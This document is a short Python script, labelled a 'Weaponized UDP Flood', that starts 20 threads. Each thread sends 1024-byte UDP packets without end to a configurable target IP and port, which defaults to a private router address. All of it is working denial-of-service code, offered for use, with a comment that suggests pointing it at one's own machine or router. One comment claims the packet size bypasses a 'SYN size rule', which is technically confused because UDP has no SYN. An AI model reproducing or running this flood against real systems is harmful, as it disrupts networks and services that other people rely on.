import socket
import threading
import time

# Target configuration (Point this at your own machine's IP, or your router)
TARGET_IP = "192.168.29.1"  # Change this to your target IP
TARGET_PORT = 80
THREADS = 20  # Spawning 20 simultaneous attackers

print(f"[*] Initializing Weaponized UDP Flood against {TARGET_IP}...")
print("[*] Spawning threads to bypass OS socket limits...")


def attack():
    # Create a raw UDP socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Create a 1024-byte payload (Large enough to bypass the SYN size rule)
    payload = b"X" * 1024

    while True:
        try:
            s.sendto(payload, (TARGET_IP, TARGET_PORT))
        except:
            pass


# Launch the threads
for i in range(THREADS):
    thread = threading.Thread(target=attack)
    thread.daemon = True  # Ensures threads die when you close the script
    thread.start()

print("[!!!] WEAPONIZED FLOOD ENGAGED. Press Ctrl+C to stop.")

# Keep the main thread alive
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[*] Flood stopped.")